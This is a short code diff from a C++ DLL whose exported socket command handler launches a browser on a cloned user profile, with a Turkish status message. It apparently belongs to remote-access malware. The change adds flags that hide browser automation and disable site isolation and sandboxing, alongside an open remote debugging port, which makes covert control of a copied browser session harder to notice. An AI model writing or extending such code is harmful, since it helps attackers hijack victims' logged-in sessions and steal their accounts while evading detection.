@@ -1300,7 +1300,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
                     cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + clonePath +
-                                 L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check --remote-debugging-port=0";
+                                 L"\" --no-sandbox --test-type --disable-gpu --no-first-run --no-default-browser-check "
+                                 L"--disable-blink-features=AutomationControlled --disable-infobars "
+                                 L"--disable-features=IsolateOrigins,site-per-process --remote-debugging-port=0";
                 } else {
                     cmdLineStr = path;
                 }
